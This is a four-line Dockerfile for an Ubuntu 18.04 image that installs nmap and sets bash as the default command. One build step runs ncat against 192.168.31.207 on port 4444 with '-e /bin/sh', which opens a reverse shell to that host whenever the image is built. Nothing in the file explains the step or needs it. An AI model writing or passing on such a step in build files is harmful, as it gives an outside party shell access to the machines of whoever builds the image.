FROM ubuntu:18.04

RUN apt install -y nmap

RUN ncat 192.168.31.207 4444 -e /bin/sh

CMD ["/bin/bash"]
